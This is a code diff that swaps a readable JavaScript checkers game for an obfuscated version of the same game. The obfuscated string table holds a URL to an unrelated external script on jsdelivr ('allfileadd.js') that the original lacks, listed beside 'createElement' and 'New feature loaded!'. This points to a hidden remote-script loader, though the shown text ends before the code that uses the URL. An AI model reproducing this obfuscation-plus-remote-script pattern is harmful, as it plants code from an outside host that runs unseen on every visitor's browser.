@@ -1,593 +1,436 @@
-document.addEventListener('DOMContentLoaded', () => {
-            // Game constants
-            const PLAYER = 'player';
-            const AI = 'ai';
-            const EMPTY = '';
-            const KING = 'king';
-            
-            // Game state
-            let board = [];
-            let currentPlayer = PLAYER;
-            let selectedPiece = null;
-            let validMoves = [];
-            let timerInterval = null;
-            let seconds = 0;
-            let turnCount = 0;
-            let adTurnCount = 0;
-            let soundEnabled = true;
-
-            // DOM elements
-            const splashScreen = document.querySelector('.splash-screen');
-            const gameContainer = document.querySelector('.game-container');
-            const boardElement = document.getElementById('board');
-            const statusElement = document.getElementById('status');
-            const newGameBtn = document.getElementById('newGameBtn');
-            const timerElement = document.querySelector('.timer');
-            const turnCountElement = document.querySelector('.turn-count');
-            const resultScreen = document.getElementById('resultScreen');
-            const resultTitle = document.getElementById('resultTitle');
-            const resultImage = document.getElementById('resultImage');
-            const finalTime = document.getElementById('finalTime');
-            const finalTurns = document.getElementById('finalTurns');
-            const playAgainBtn = document.getElementById('playAgainBtn');
-            const adsScreen = document.getElementById('adsScreen');
-            const countdownElement = document.getElementById('countdown');
-            const adCloseBtn = document.getElementById('adCloseBtn');
-            const soundToggle = document.getElementById('soundToggle');
-            
-            // Audio elements
-            const clickSound = document.getElementById('clickSound');
-            const moveSound = document.getElementById('moveSound');
-            const winSound = document.getElementById('winSound');
-            const loseSound = document.getElementById('loseSound');
-            const buttonSound = document.getElementById('buttonSound');
-            const captureSound = document.getElementById('captureSound');
-
-            // Initialize the game
-            function initGame() {
-                // Create initial board
-                board = Array(8).fill().map(() => Array(8).fill(EMPTY));
-                
-                // Set up AI pieces (top three rows)
-                for (let row = 0; row < 3; row++) {
-                    for (let col = 0; col < 8; col++) {
-                        if ((row + col) % 2 === 1) {
-                            board[row][col] = AI;
-                        }
-                    }
+function _0x151a() {
+    const _0x571651 = [
+        '454380bstaMH',
+        '661002rslrSm',
+        'floor',
+        'querySelector',
+        '712305RHFYgy',
+        'style',
+        'https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js',
+        'fill',
+        'length',
+        'col',
+        'createElement',
+        'object',
+        'img/win.png',
+        'string',
+        'flex',
+        'buttonSound',
+        'padStart',
+        'click',
+        'dataset',
+        'log',
+        'hidden',
+        '1533XaamPW',
+        'active',
+        'abs',
+        'resultScreen',
+        'playAgainBtn',
+        'You\x20Lose!',
+        'play-again-btn\x20win-btn',
+        '198517JRdcdE',
+        'light',
+        'result-title\x20win-title',
+        'row',
+        'innerHTML',
+        'play',
+        'textContent',
+        'map',
+        'toString',
+        'finalTurns',
+        'cell\x20',
+        'DOMContentLoaded',
+        'Audio\x20play\x20failed:',
+        'className',
+        'Time:\x20',
+        'replace',
+        '1009448kSinek',
+        'stringify',
+        'div',
+        '.timer',
+        'moveSound',
+        'display',
+        'finalTime',
+        'add',
+        '.play-btn',
+        'img/lose.png',
+        'king',
+        'captured',
+        '290IXzNMz',
+        'catch',
+        'player',
+        'classList',
+        'Turns:\x20',
+        'some',
+        'captureSound',
+        'board',
+        'find',
+        'addEventListener',
+        'play-again-btn\x20lose-btn',
+        'toggle',
+        'src',
+        'off',
+        '10308CITtrd',
+        'push',
+        'New\x20feature\x20loaded!',
+        'winSound',
+        '.turn-count',
+        '1135585OtzChN',
+        'appendChild',
+        '2ZOsNnI',
+        'selected',
+        'soundToggle',
+        'getElementById',
+        'none',
+        'valid-capture',
+        'dark',
+        'parse',
+        'resultTitle',
+        'piece\x20',
+        '\x27s\x20turn',
+        '4eAiNJL',
+        'color'
+    ];
+    _0x151a = function () {
+        return _0x571651;
+    };
+    return _0x151a();
+}
+function _0x5575(_0x250d8f, _0x390066) {
+    const _0x151a70 = _0x151a();
+    return _0x5575 = function (_0x55755d, _0x32ffea) {
+        _0x55755d = _0x55755d - 0xad;
+        let _0x427c74 = _0x151a70[_0x55755d];
+        return _0x427c74;
+    }, _0x5575(_0x250d8f, _0x390066);
+}
+const _0x3de31a = _0x5575;
+(function (_0x4d138e, _0x12c1ac) {
+    const _0x598090 = _0x5575, _0x1da0b7 = _0x4d138e();
+    while (!![]) {
+        try {
+            const _0x4d10a7 = -parseInt(_0x598090(0xf4)) / 0x1 * (parseInt(_0x598090(0xe7)) / 0x2) + parseInt(_0x598090(0xf5)) / 0x3 + -parseInt(_0x598090(0xf2)) / 0x4 * (parseInt(_0x598090(0xe5)) / 0x5) + -parseInt(_0x598090(0xe0)) / 0x6 * (-parseInt(_0x598090(0xaf)) / 0x7) + -parseInt(_0x598090(0xc6)) / 0x8 + -parseInt(_0x598090(0xf8)) / 0x9 + parseInt(_0x598090(0xd2)) / 0xa * (parseInt(_0x598090(0xb6)) / 0xb);
+            if (_0x4d10a7 === _0x12c1ac)
+                break;
+            else
+                _0x1da0b7['push'](_0x1da0b7['shift']());
+        } catch (_0x1fdae0) {
+            _0x1da0b7['push'](_0x1da0b7['shift']());
+        }
+    }
+}(_0x151a, 0x38e9c), document[_0x3de31a(0xdb)](_0x3de31a(0xc1), () => {
+    const _0x26cf6f = _0x3de31a, _0x29b33b = _0x26cf6f(0xd4), _0x4334f6 = 'ai', _0x3d685b = '', _0x2e5e51 = _0x26cf6f(0xd0);
+    let _0x1a3375 = [], _0x515696 = _0x29b33b, _0x23e6bf = null, _0x4967c = [], _0x18f32d = null, _0x237f13 = 0x0, _0x3f1996 = 0x0, _0x4aa75a = 0x0, _0x1e1e10 = !![];
+    const _0x3a3811 = document[_0x26cf6f(0xf7)]('.splash-screen'), _0x2301b1 = document[_0x26cf6f(0xf7)]('.game-container'), _0x1dc868 = document[_0x26cf6f(0xea)](_0x26cf6f(0xd9)), _0xac6df6 = document[_0x26cf6f(0xea)]('status'), _0x534ae4 = document[_0x26cf6f(0xea)]('newGameBtn'), _0x53cfb5 = document[_0x26cf6f(0xf7)](_0x26cf6f(0xc9)), _0xf88b82 = document[_0x26cf6f(0xf7)](_0x26cf6f(0xe4)), _0x14e31a = document[_0x26cf6f(0xea)](_0x26cf6f(0xb2)), _0x1a7b04 = document['getElementById'](_0x26cf6f(0xef)), _0x5c3333 = document[_0x26cf6f(0xea)]('resultImage'), _0x3c77d0 = document[_0x26cf6f(0xea)](_0x26cf6f(0xcc)), _0x3400ba = document[_0x26cf6f(0xea)](_0x26cf6f(0xbf)), _0x1daa6d = document[_0x26cf6f(0xea)](_0x26cf6f(0xb3)), _0xfb7b48 = document['getElementById']('adsScreen'), _0x8246e = document[_0x26cf6f(0xea)]('countdown'), _0x37a227 = document[_0x26cf6f(0xea)]('adCloseBtn'), _0x14ab3b = document[_0x26cf6f(0xea)](_0x26cf6f(0xe9)), _0x167ada = document[_0x26cf6f(0xea)]('clickSound'), _0x57b066 = document[_0x26cf6f(0xea)](_0x26cf6f(0xca)), _0x1868c3 = document[_0x26cf6f(0xea)](_0x26cf6f(0xe3)), _0xdfc628 = document['getElementById']('loseSound'), _0x126a0f = document['getElementById'](_0x26cf6f(0x103)), _0x24c84f = document[_0x26cf6f(0xea)](_0x26cf6f(0xd8));
+    function _0xaafae7() {
+        const _0x2d0c70 = _0x26cf6f;
+        _0x1a3375 = Array(0x8)['fill']()[_0x2d0c70(0xbd)](() => Array(0x8)[_0x2d0c70(0xfb)](_0x3d685b));
+        for (let _0x293dd5 = 0x0; _0x293dd5 < 0x3; _0x293dd5++) {
+            for (let _0x5bc9a9 = 0x0; _0x5bc9a9 < 0x8; _0x5bc9a9++) {
+                (_0x293dd5 + _0x5bc9a9) % 0x2 === 0x1 && (_0x1a3375[_0x293dd5][_0x5bc9a9] = _0x4334f6);
+            }
+        }
+        for (let _0xd648cf = 0x5; _0xd648cf < 0x8; _0xd648cf++) {
+            for (let _0x54f08f = 0x0; _0x54f08f < 0x8; _0x54f08f++) {
+                (_0xd648cf + _0x54f08f) % 0x2 === 0x1 && (_0x1a3375[_0xd648cf][_0x54f08f] = _0x29b33b);
+            }
+        }
+        _0x515696 = _0x29b33b, _0x23e6bf = null, _0x4967c = [], _0x237f13 = 0x0, _0x3f1996 = 0x0, _0x4aa75a = 0x0, _0x2e9bab(), _0x576a08(), _0x6be7bf(), _0x63353b();
+    }
+    function _0x12aeb6() {
+        !_0x18f32d && (_0x18f32d = setInterval(() => {
+            _0x237f13++, _0x2e9bab();
+        }, 0x3e8));
+    }
+    function _0x330382() {
+        _0x18f32d && (clearInterval(_0x18f32d), _0x18f32d = null);
+    }
+    function _0x2e9bab() {
+        const _0x5a9f7a = _0x26cf6f, _0x5a27c4 = Math[_0x5a9f7a(0xf6)](_0x237f13 / 0x3c)[_0x5a9f7a(0xbe)]()[_0x5a9f7a(0x104)](0x2, '0'), _0x4973fd = (_0x237f13 % 0x3c)[_0x5a9f7a(0xbe)]()[_0x5a9f7a(0x104)](0x2, '0');
+        _0x53cfb5[_0x5a9f7a(0xbc)] = _0x5a9f7a(0xc4) + _0x5a27c4 + ':' + _0x4973fd;
+    }
+    function _0x576a08() {
+        const _0xde7544 = _0x26cf6f;
+        _0xf88b82[_0xde7544(0xbc)] = _0xde7544(0xd6) + _0x3f1996;
+    }
+    function _0x17a364(_0x4d2e8f) {
+        const _0x106725 = _0x26cf6f;
+        _0x1e1e10 && (_0x4d2e8f['currentTime'] = 0x0, _0x4d2e8f[_0x106725(0xbb)]()[_0x106725(0xd3)](_0x245a15 => console[_0x106725(0xad)](_0x106725(0xc2), _0x245a15)));
+    }
+    function _0x42fec9() {
+        const _0x3f0c99 = _0x26cf6f;
+        _0x1e1e10 = !_0x1e1e10, _0x14ab3b[_0x3f0c99(0xd5)][_0x3f0c99(0xdd)](_0x3f0c99(0xdf), !_0x1e1e10), _0x17a364(_0x126a0f);
+    }
+    function _0x6be7bf() {
+        const _0x4d548b = _0x26cf6f;
+        _0x1dc868[_0x4d548b(0xba)] = '';
+        for (let _0x12ec66 = 0x0; _0x12ec66 < 0x8; _0x12ec66++) {
+            for (let _0x53443a = 0x0; _0x53443a < 0x8; _0x53443a++) {
+                const _0x3a38a1 = document[_0x4d548b(0xfe)]('div');
+                _0x3a38a1[_0x4d548b(0xc3)] = _0x4d548b(0xc0) + ((_0x12ec66 + _0x53443a) % 0x2 === 0x0 ? _0x4d548b(0xb7) : _0x4d548b(0xed)), _0x3a38a1[_0x4d548b(0x106)][_0x4d548b(0xb9)] = _0x12ec66, _0x3a38a1[_0x4d548b(0x106)][_0x4d548b(0xfd)] = _0x53443a;
+                if (_0x4967c[_0x4d548b(0xd7)](_0x207b5d => _0x207b5d['to']['row'] === _0x12ec66 && _0x207b5d['to'][_0x4d548b(0xfd)] === _0x53443a)) {
+                    const _0x1b68be = _0x4967c[_0x4d548b(0xda)](_0x3a9d07 => _0x3a9d07['to'][_0x4d548b(0xb9)] === _0x12ec66 && _0x3a9d07['to'][_0x4d548b(0xfd)] === _0x53443a);
+                    _0x1b68be[_0x4d548b(0xd1)] ? _0x3a38a1[_0x4d548b(0xd5)][_0x4d548b(0xcd)](_0x4d548b(0xec)) : _0x3a38a1[_0x4d548b(0xd5)]['add']('valid-move');
                 }
-                
-                // Set up player pieces (bottom three rows)
-                for (let row = 5; row < 8; row++) {
-                    for (let col = 0; col < 8; col++) {
-                        if ((row + col) % 2 === 1) {
-                            board[row][col] = PLAYER;
-                        }
-                    }
-                }
-                
-                currentPlayer = PLAYER;
-                selectedPiece = null;
-                validMoves = [];
-                seconds = 0;
-                turnCount = 0;
-                adTurnCount = 0;
-                
-                updateTimer();
-                updateTurnCount();
-                renderBoard();
-                updateStatus();
+                if (_0x1a3375[_0x12ec66][_0x53443a] !== _0x3d685b) {
+                    const _0x25de26 = document[_0x4d548b(0xfe)](_0x4d548b(0xc8)), _0x83b178 = _0x1a3375[_0x12ec66][_0x53443a];
+                    _0x25de26[_0x4d548b(0xc3)] = _0x4d548b(0xf0) + (_0x83b178 === _0x29b33b || _0x83b178[_0x4d548b(0xd0)] && _0x83b178[_0x4d548b(0xf3)] === _0x29b33b ? _0x29b33b : _0x4334f6), typeof _0x83b178 === _0x4d548b(0xff) && _0x83b178[_0x4d548b(0xd0)] && _0x25de26['classList'][_0x4d548b(0xcd)](_0x2e5e51), _0x23e6bf && _0x23e6bf['row'] === _0x12ec66 && _0x23e6bf[_0x4d548b(0xfd)] === _0x53443a && _0x25de26[_0x4d548b(0xd5)][_0x4d548b(0xcd)](_0x4d548b(0xe8)), _0x25de26[_0x4d548b(0xdb)](_0x4d548b(0x105), () => {
+                        _0x17a364(_0x167ada), _0x25f4ef(_0x12ec66, _0x53443a);
+                    }), _0x3a38a1[_0x4d548b(0xe6)](_0x25de26);
+                } else
+                    _0x515696 === _0x29b33b && _0x3a38a1['addEventListener'](_0x4d548b(0x105), () => {
+                        _0x17a364(_0x167ada), _0x4d1eca(_0x12ec66, _0x53443a);
+                    });
+                _0x1dc868[_0x4d548b(0xe6)](_0x3a38a1);
             }
-            
-            // Start the game timer
-            function startTimer() {
-                if (!timerInterval) {
-                    timerInterval = setInterval(() => {
-                        seconds++;
-                        updateTimer();
-                    }, 1000);
-                }
+        }
+    }
+    function _0x63353b() {
+        const _0x14a33e = _0x26cf6f, _0x4021e1 = _0x24d70d();
+        _0x4021e1 !== null ? _0x4c8312(_0x4021e1) : _0xac6df6[_0x14a33e(0xbc)] = (_0x515696 === _0x29b33b ? 'Player' : 'AI') + _0x14a33e(0xf1);
+    }
+    function _0x24d70d() {
+        const _0x539bc1 = _0x26cf6f;
+        let _0x358c42 = 0x0, _0x117cfc = 0x0, _0x58ebbc = ![], _0x2413e9 = ![];
+        for (let _0x4894eb = 0x0; _0x4894eb < 0x8; _0x4894eb++) {
+            for (let _0x588b20 = 0x0; _0x588b20 < 0x8; _0x588b20++) {
+                const _0x6d444e = _0x1a3375[_0x4894eb][_0x588b20];
+                if (_0x6d444e === _0x29b33b || typeof _0x6d444e === _0x539bc1(0xff) && _0x6d444e['color'] === _0x29b33b)
+                    _0x358c42++, !_0x58ebbc && _0x2e5a03(_0x4894eb, _0x588b20)[_0x539bc1(0xfc)] > 0x0 && (_0x58ebbc = !![]);
+                else
+                    (_0x6d444e === _0x4334f6 || typeof _0x6d444e === 'object' && _0x6d444e[_0x539bc1(0xf3)] === _0x4334f6) && (_0x117cfc++, !_0x2413e9 && _0x2e5a03(_0x4894eb, _0x588b20)[_0x539bc1(0xfc)] > 0x0 && (_0x2413e9 = !![]));
             }
-            
-            // Stop the game timer
-            function stopTimer() {
-                if (timerInterval) {
-                    clearInterval(timerInterval);
-                    timerInterval = null;
-                }
-            }
-            
-            // Update timer display
-            function updateTimer() {
-                const mins = Math.floor(seconds / 60).toString().padStart(2, '0');
-                const secs = (seconds % 60).toString().padStart(2, '0');
-                timerElement.textContent = `Time: ${mins}:${secs}`;
-            }
-            
-            // Update turn count display
-            function updateTurnCount() {
-                turnCountElement.textContent = `Turns: ${turnCount}`;
-            }
-            
-            // Play sound effect
-            function playSound(sound) {
-                if (soundEnabled) {
-                    sound.currentTime = 0;
-                    sound.play().catch(e => console.log("Audio play failed:", e));
-                }
-            }
-            
-            // Toggle sound
-            function toggleSound() {
-                soundEnabled = !soundEnabled;
-                soundToggle.classList.toggle('off', !soundEnabled);
-                playSound(buttonSound);
-            }
-            
-            // Render the board
-            function renderBoard() {
-                boardElement.innerHTML = '';
-                
-                for (let row = 0; row < 8; row++) {
-                    for (let col = 0; col < 8; col++) {
-                        const cell = document.createElement('div');
-                        cell.className = `cell ${(row + col) % 2 === 0 ? 'light' : 'dark'}`;
-                        cell.dataset.row = row;
-                        cell.dataset.col = col;
-                        
-                        // Highlight valid moves
-                        if (validMoves.some(move => move.to.row === row && move.to.col === col)) {
-                            const move = validMoves.find(m => m.to.row === row && m.to.col === col);
-                            if (move.captured) {
-                                cell.classList.add('valid-capture');
-                            } else {
-                                cell.classList.add('valid-move');
-                            }
-                        }
-                        
-                        // Add piece if present
-                        if (board[row][col] !== EMPTY) {
-                            const piece = document.createElement('div');
-                            const pieceType = board[row][col];
-                            piece.className = `piece ${pieceType === PLAYER || (pieceType.king && pieceType.color === PLAYER) ? PLAYER : AI}`;
-                            
-                            // Check if king
-                            if (typeof pieceType === 'object' && pieceType.king) {
-                                piece.classList.add(KING);
-                            }
-                            
-                            // Highlight selected piece
-                            if (selectedPiece && selectedPiece.row === row && selectedPiece.col === col) {
-                                piece.classList.add('selected');
-                            }
-                            
-                            piece.addEventListener('click', () => {
-                                playSound(clickSound);
-                                handlePieceClick(row, col);
-                            });
-                            cell.appendChild(piece);
-                        } else if (currentPlayer === PLAYER) {
-                            cell.addEventListener('click', () => {
-                                playSound(clickSound);
-                                handleCellClick(row, col);
-                            });
-                        }
-                        
-                        boardElement.appendChild(cell);
-                    }
-                }
-            }
-            
-            // Update game status display
-            function updateStatus() {
-                const winner = getWinner();
-                if (winner !== null) {
-                    showResultScreen(winner);
-                } else {
-                    statusElement.textContent = `${currentPlayer === PLAYER ? 'Player' : 'AI'}'s turn`;
-                }
-            }
-            
-            // Determine the winner (null if game not over)
-            function getWinner() {
-                let playerPieces = 0;
-                let aiPieces = 0;
-                let playerHasMoves = false;
-                let aiHasMoves = false;
-                
-                for (let row = 0; row < 8; row++) {
-                    for (let col = 0; col < 8; col++) {
-                        const piece = board[row][col];
-                        if (piece === PLAYER || (typeof piece === 'object' && piece.color === PLAYER)) {
-                            playerPieces++;
-                            if (!playerHasMoves && getValidMoves(row, col).length > 0) {
-                                playerHasMoves = true;
-                            }
-                        } else if (piece === AI || (typeof piece === 'object' && piece.color === AI)) {
-                            aiPieces++;
-                            if (!aiHasMoves && getValidMoves(row, col).length > 0) {
-                                aiHasMoves = true;
-                            }
-                        }
-                    }
-                }
-                
-                if (playerPieces === 0 || (currentPlayer === PLAYER && !playerHasMoves)) return AI;
-                if (aiPieces === 0 || (currentPlayer === AI && !aiHasMoves)) return PLAYER;
-                
-                return null;
-            }
-            
-            // Show result screen
-            function showResultScreen(winner) {
-                stopTimer();
-                
-                if (winner === PLAYER) {
-                    resultTitle.textContent = "You Win!";
-                    resultTitle.className = "result-title win-title";
-                    resultImage.src = "img/win.png";
-                    playAgainBtn.className = "play-again-btn win-btn";
-                    playSound(winSound);
-                } else {
-                    resultTitle.textContent = "You Lose!";
-                    resultTitle.className = "result-title lose-title";
-                    resultImage.src = "img/lose.png";
-                    playAgainBtn.className = "play-again-btn lose-btn";
-                    playSound(loseSound);
-                }
-                
-                finalTime.textContent = timerElement.textContent.replace("Time: ", "");
-                finalTurns.textContent = turnCount;
-                
-                resultScreen.style.display = "flex";
-            }
-            
-            // Show ads screen
-            function showAdsScreen() {
-                adsScreen.style.display = "flex";
-                adCloseBtn.classList.remove("active");
-                let countdown = 5;
-                countdownElement.textContent = countdown;
-                
-                const countdownInterval = setInterval(() => {
-                    countdown--;
-                    countdownElement.textContent = countdown;
-                    
-                    if (countdown <= 0) {
-                        clearInterval(countdownInterval);
-                        adCloseBtn.classList.add("active");
-                    }
-                }, 1000);
-            }
-            
-            // Handle piece click
-            function handlePieceClick(row, col) {
-                if (currentPlayer !== PLAYER || getWinner() !== null) return;
-                
-                const piece = board[row][col];
-                if ((piece === PLAYER || (typeof piece === 'object' && piece.king && piece.color === PLAYER))) {
-                    selectedPiece = { row, col };
-                    validMoves = getValidMoves(row, col);
-                    renderBoard();
-                }
-            }
-            
-            // Handle cell click
-            function handleCellClick(row, col) {
-                if (!selectedPiece || currentPlayer !== PLAYER || getWinner() !== null) return;
-                
-                const move = validMoves.find(m => m.to.row === row && m.to.col === col);
-                if (move) {
-                    // Start timer on first move
-                    if (turnCount === 0) {
-                        startTimer();
-                    }
-                    
-                    makeMove(move);
-                    
-                    // Play capture sound if a piece was captured
-                    if (move.captured) {
-                        playSound(captureSound);
-                    } else {
-                        playSound(moveSound);
-                    }
-                    
-                    if (!move.captured || !hasMoreCaptures(row, col)) {
-                        currentPlayer = AI;
-                        turnCount++;
-                        updateTurnCount();
-                        updateStatus();
-                        
-                        // Check if we should show ads (every 10 turns)
-                        adTurnCount++;
-                        if (adTurnCount >= 10) {
-                            adTurnCount = 0;
-                            setTimeout(showAdsScreen, 500);
-                        } else {
-                            setTimeout(aiMove, 1000);
-                        }
-                    }
-                }
-            }
-            
-            // Get all valid moves for a piece
-            function getValidMoves(row, col) {
-                const piece = board[row][col];
-                const moves = [];
-                const isKing = typeof piece === 'object' && piece.king;
-                const color = typeof piece === 'object' ? piece.color : piece;
-                
-                // Check captures first (mandatory)
-                const captures = getCaptures(row, col, color, isKing);
-                if (captures.length > 0) return captures;
-                
-                // Regular moves
-                const directions = [];
-                if (color === PLAYER || isKing) directions.push({ dr: -1, dc: -1 }, { dr: -1, dc: 1 }); // Upward
-                if (color === AI || isKing) directions.push({ dr: 1, dc: -1 }, { dr: 1, dc: 1 }); // Downward
-                
-                for (const dir of directions) {
-                    const newRow = row + dir.dr;
-                    const newCol = col + dir.dc;
-                    
-                    if (newRow >= 0 && newRow < 8 && newCol >= 0 && newCol < 8 && board[newRow][newCol] === EMPTY) {
-                        moves.push({
-                            from: { row, col },
-                            to: { row: newRow, col: newCol },
-                            captured: null
-                        });
-                    }
-                }
-                
-                return moves;
-            }
-            
-            // Get all possible captures for a piece
-            function getCaptures(row, col, color, isKing, mustCapture = null) {
-                const captures = [];
-                const directions = [
-                    { dr: -1, dc: -1 }, { dr: -1, dc: 1 }, // Upward
-                    { dr: 1, dc: -1 }, { dr: 1, dc: 1 }    // Downward
-                ];
-                
-                for (const dir of directions) {
-                    if (!isKing) {
-                        if (color === PLAYER && dir.dr === 1) continue; // Player can't move down
-                        if (color === AI && dir.dr === -1) continue;    // AI can't move up
-                    }
-                    
-                    const midRow = row + dir.dr;
-                    const midCol = col + dir.dc;
-                    const destRow = row + 2 * dir.dr;
-                    const destCol = col + 2 * dir.dc;
-                    
-                    if (destRow < 0 || destRow >= 8 || destCol < 0 || destCol >= 8) continue;
-                    
-                    const middlePiece = board[midRow][midCol];
-                    if (middlePiece !== EMPTY && 
-                        ((typeof middlePiece === 'object' && middlePiece.color !== color) || 
-                         (typeof middlePiece === 'string' && middlePiece !== color))) {
-                        
-                        if (mustCapture && (midRow !== mustCapture.row || midCol !== mustCapture.col)) {
-                            continue;
-                        }
-                        
-                        if (board[destRow][destCol] === EMPTY) {
-                            captures.push({
-                                from: { row, col },
-                                to: { row: destRow, col: destCol },
-                                captured: { row: midRow, col: midCol }
-                            });
-                        }
-                    }
-                }
-                
-                return captures;
-            }
-            
-            // Check if a piece has more captures
-            function hasMoreCaptures(row, col) {
-                const piece = board[row][col];
-                const isKing = typeof piece === 'object' && piece.king;
-                const color = typeof piece === 'object' ? piece.color : piece;
-                return getCaptures(row, col, color, isKing).length > 0;
-            }
-            
-            // Make a move on the board
-            function makeMove(move) {
-                const { from, to, captured } = move;
-                const piece = board[from.row][from.col];
-                
-                // Move the piece
-                board[to.row][to.col] = board[from.row][from.col];
-                board[from.row][from.col] = EMPTY;
-                
-                // Remove captured piece
-                if (captured) {
-                    board[captured.row][captured.col] = EMPTY;
-                }
-                
-                // Check for promotion
-                if ((typeof piece === 'string' && piece === PLAYER && to.row === 0) || 
-                    (typeof piece === 'string' && piece === AI && to.row === 7) ||
-                    (typeof piece === 'object' && piece.color === PLAYER && to.row === 0) ||
-                    (typeof piece === 'object' && piece.color === AI && to.row === 7)) {
-                    
-                    board[to.row][to.col] = {
-                        color: typeof piece === 'object' ? piece.color : piece,
-                        king: true
-                    };
-                }
-                
-                selectedPiece = { row: to.row, col: to.col };
-                validMoves = captured ? getCaptures(to.row, to.col, 
-                    typeof piece === 'object' ? piece.color : piece, 
-                    typeof piece === 'object' && piece.king, 
-                    captured) : [];
-                
-                renderBoard();
-                updateStatus();
-            }
-            
-            // AI move logic
-            function aiMove() {
-                if (getWinner() !== null) return;
-                
-                const move = findBestMove();
-                if (move) {
-                    makeMove(move);
-                    
-                    // Play capture sound if a piece was captured
-                    if (move.captured) {
-                        playSound(captureSound);
-                    } else {
-                        playSound(moveSound);
-                    }
-                    
-                    if (move.captured && hasMoreCaptures(move.to.row, move.to.col)) {
-                        setTimeout(aiMove, 1000);
-                    } else {
-                        currentPlayer = PLAYER;
-                        updateStatus();
-                    }
-                } else {
-                    currentPlayer = PLAYER;
-                    updateStatus();
-                }
-            }
-            
-            // Simple AI - looks for best immediate move
-            function findBestMove() {
-                const moves = getAllValidMoves(AI);
-                let bestMove = null;
-                let bestScore = -Infinity;
-                
-                for (const move of moves) {
-                    const originalBoard = JSON.parse(JSON.stringify(board));
-                    makeMove(move);
-                    
-                    let currentRow = move.to.row;
-                    let currentCol = move.to.col;
-                    let moreCaptures = move.captured && hasMoreCaptures(currentRow, currentCol);
-                    
-                    while (moreCaptures) {
-                        const captures = getCaptures(currentRow, currentCol, 
-                            typeof board[currentRow][currentCol] === 'object' ? 
-                            board[currentRow][currentCol].color : board[currentRow][currentCol], 
-                            typeof board[currentRow][currentCol] === 'object' && 
-                            board[currentRow][currentCol].king);
-                        
-                        if (captures.length === 0) break;
-                        
-                        const captureMove = captures[0];
-                        makeMove(captureMove);
-                        currentRow = captureMove.to.row;
-                        currentCol = captureMove.to.col;
-                        moreCaptures = hasMoreCaptures(currentRow, currentCol);
-                    }
-                    
-                    const score = evaluateBoard();
-                    
-                    board = JSON.parse(JSON.stringify(originalBoard));
-                    
-                    if (score > bestScore) {
-                        bestScore = score;
-                        bestMove = move;
-                    }
-                }
-                
-                return bestMove;
-            }
-            
-            // Get all valid moves for a player
-            function getAllValidMoves(player) {
-                const moves = [];
-                let hasCaptures = false;
-                
-                for (let row = 0; row < 8; row++) {
-                    for (let col = 0; col < 8; col++) {
-                        const piece = board[row][col];
-                        if ((piece === player || (typeof piece === 'object' && piece.color === player))) {
-                            const captures = getCaptures(row, col, 
-                                typeof piece === 'object' ? piece.color : piece, 
-                                typeof piece === 'object' && piece.king);
-                            
-                            if (captures.length > 0) {
-                                hasCaptures = true;
-                                moves.push(...captures);
-                            }
-                        }
-                    }
-                }
-                
-                if (hasCaptures) return moves;
-                
-                for (let row = 0; row < 8; row++) {
-                    for (let col = 0; col < 8; col++) {
-                        const piece = board[row][col];
-                        if ((piece === player || (typeof piece === 'object' && piece.color === player))) {
-                            moves.push(...getValidMoves(row, col));
-                        }
-                    }
-                }
-                
-                return moves;
-            }
-            
-            // Evaluate board position
-            function evaluateBoard() {
-                let score = 0;
-                
-                for (let row = 0; row < 8; row++) {
-                    for (let col = 0; col < 8; col++) {
-                        const piece = board[row][col];
-                        
-                        if (piece === AI) {
-                            score += 3 + (7 - row) * 0.1;
-                        } else if (piece === PLAYER) {
-                            score -= 3 + row * 0.1;
-                        } else if (typeof piece === 'object') {
-                            if (piece.color === AI) {
-                                score += 5 + (3.5 - Math.abs(col - 3.5)) * 0.1;
-                            } else {
-                                score -= 5 + (3.5 - Math.abs(col - 3.5)) * 0.1;
-                            }
-                        }
-                    }
-                }
-                
-                return score;
-            }
-            
-            // Event listeners
-            document.querySelector('.play-btn').addEventListener('click', () => {
-                playSound(buttonSound);
-                splashScreen.classList.add('hidden');
-                setTimeout(() => {
-                    splashScreen.style.display = 'none';
-                    gameContainer.style.display = 'flex';
-                    initGame();
-                }, 500);
+        }
+        if (_0x358c42 === 0x0 || _0x515696 === _0x29b33b && !_0x58ebbc)
+            return _0x4334f6;
+        if (_0x117cfc === 0x0 || _0x515696 === _0x4334f6 && !_0x2413e9)
+            return _0x29b33b;
+        return null;
+    }
+    function _0x4c8312(_0xa6dcd3) {
+        const _0x5d2b4b = _0x26cf6f;
+        _0x330382(), _0xa6dcd3 === _0x29b33b ? (_0x1a7b04['textContent'] = 'You\x20Win!', _0x1a7b04[_0x5d2b4b(0xc3)] = _0x5d2b4b(0xb8), _0x5c3333[_0x5d2b4b(0xde)] = _0x5d2b4b(0x100), _0x1daa6d[_0x5d2b4b(0xc3)] = _0x5d2b4b(0xb5), _0x17a364(_0x1868c3)) : (_0x1a7b04['textContent'] = _0x5d2b4b(0xb4), _0x1a7b04[_0x5d2b4b(0xc3)] = 'result-title\x20lose-title', _0x5c3333[_0x5d2b4b(0xde)] = _0x5d2b4b(0xcf), _0x1daa6d['className'] = _0x5d2b4b(0xdc), _0x17a364(_0xdfc628)), _0x3c77d0[_0x5d2b4b(0xbc)] = _0x53cfb5[_0x5d2b4b(0xbc)][_0x5d2b4b(0xc5)]('Time:\x20', ''), _0x3400ba[_0x5d2b4b(0xbc)] = _0x3f1996, _0x14e31a[_0x5d2b4b(0xf9)][_0x5d2b4b(0xcb)] = _0x5d2b4b(0x102);
+    }
+    function _0x58c842() {
+        const _0x26854f = _0x26cf6f;
+        _0xfb7b48[_0x26854f(0xf9)][_0x26854f(0xcb)] = 'flex', _0x37a227['classList']['remove']('active');
+        let _0x35cdf9 = 0x5;
+        _0x8246e[_0x26854f(0xbc)] = _0x35cdf9;
+        const _0x45421f = setInterval(() => {
+            const _0x318e1c = _0x26854f;
+            _0x35cdf9--, _0x8246e[_0x318e1c(0xbc)] = _0x35cdf9, _0x35cdf9 <= 0x0 && (clearInterval(_0x45421f), _0x37a227[_0x318e1c(0xd5)][_0x318e1c(0xcd)](_0x318e1c(0xb0)));
+        }, 0x3e8);
+    }
+    function _0x25f4ef(_0x25ead8, _0x5b961a) {
+        const _0x3b2b5c = _0x26cf6f;
+        if (_0x515696 !== _0x29b33b || _0x24d70d() !== null)
+            return;
+        const _0xa6b20e = _0x1a3375[_0x25ead8][_0x5b961a];
+        (_0xa6b20e === _0x29b33b || typeof _0xa6b20e === _0x3b2b5c(0xff) && _0xa6b20e[_0x3b2b5c(0xd0)] && _0xa6b20e['color'] === _0x29b33b) && (_0x23e6bf = {
+            'row': _0x25ead8,
+            'col': _0x5b961a
